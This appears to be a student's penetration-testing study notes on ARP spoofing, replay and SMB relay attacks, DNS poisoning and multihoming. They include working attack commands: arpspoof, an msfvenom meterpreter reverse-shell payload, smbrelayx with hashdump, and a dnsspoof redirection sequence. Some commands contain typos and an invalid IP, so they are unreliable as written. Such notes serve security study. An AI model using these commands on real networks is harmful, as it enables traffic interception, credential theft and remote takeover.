#5.2

ARP
How does ARP work?
ARP broadcasts come from an originating device asking WHO HAS the IP they are trying to reach. The responding device replies with their address and the MAC address.
In ARP Spoofing, attackers send a fake ARP reply that they have the IP being sought out, so they can intercept traffic.
If the attacker can spoof the default gateway, all traffic can be intercepted that is being sent out to the gateway.

ARP Spoofing can be used to steal information, deny service, hijack session IDs, and allow on-path attacks.

ARP Spoof example:
arpspoof -i eth0 -t 192.100.0.00 -r 192.100.1.1
# -r allows attacker to capture traffic in both directions
# removing the target -t will allow all arp caches on the subnet to be spoofed, so all default gateway traffic is intercepted

A kernel forwarding must first be set, such as:
echo 1 > /proc/sys/net/ipv4/ip_forward


#Replay Attacks (4.9)
if you are able to complete an on-path attack you may capture a hash which allows you to log into a server

#Relay Attack (5.2)
Same as above but now the authentication is caught in the middle by the attacker who relays it to the server so the "access granted" message is returned to the attacker, rather than the authenticated party
Both RESPONDER and METASPLOIT can perform these attacks

#SMB Relay Attack
The steps above are similar but now we create a reverse TCP Connection and use Metrepreter session
Example:
msfvenom -p windows/meterpreter/reverse_tcp for a reverse shell
[[See Image 5.1]]

msfconsole can create the listener which allows metasploit to listen, then run the reverse executable "smbrelayx.py"
[[See Image 5.2]]

the meterpreter session can establish connection allowing the attacker to gain system information
[[See Image 5.3]]

Using hashdump, an offline password cracker can be used to get into the server.

# DNS (2.9, 5.3)
Understand DNS reverse lookups and enumeration.

NetBIOS is often used by Microsoft.
Hostname resolution is often used outside of NetBIOS.
If a local hosts file doesn't contain the information for a domain name, a DNS query will be sent to the the DNS Server.

An attacker can poison a local host file with a bogus ip address leading a name.com to lead to the incorrect IP, owned by the attacke.

An attacker can forge the response to a dns resolver (since they used UDP rather than TCP) so it can accept the forged response as legitimate and use it as the true site.

dnsenumeration

dnsdumpster

dnsexfil

Using a Default Gateway of 192.168.4.1, a Target Machine of 192.168.4.10
and a Fake/Spoof website IP of 192.168.4.20
we could spoof DNS as follows:
echo 1 > /proc/sys/net/ipv4/ip_forward 
arpspoof -i eth0 -t 192.168.4.10 192.168.4.1
arpspoof -i eth- -t 192.168.4.1 192.168.4.10
echo 192.168.4.20 www.realwebsite.com > poison_hostlist.txt
dnsspof -i eth0 -f poison_hostlist.txt
nslookup www.realwebsite.com

The result will return the spooked web address of 192.168.4.20
[[See example image 5.4]]

#Multihoming (4.2)
Multihoming is the practice of connecting a host or a computer network to more than one network. This can be done in order to increase reliability or performance.

A typical host or end-user network is connected to just one network. Connecting to multiple networks can increase reliability because if one connection fails, packets can still be routed through the remaining connection. Connecting to multiple networks can also improve performance because data can be transmitted and received through the multiple connections simultaneously multiplying throughput and, depending on the destination, it may be more efficient to route through one network or the other. 
See; https://en.wikipedia.org/wiki/Multihoming


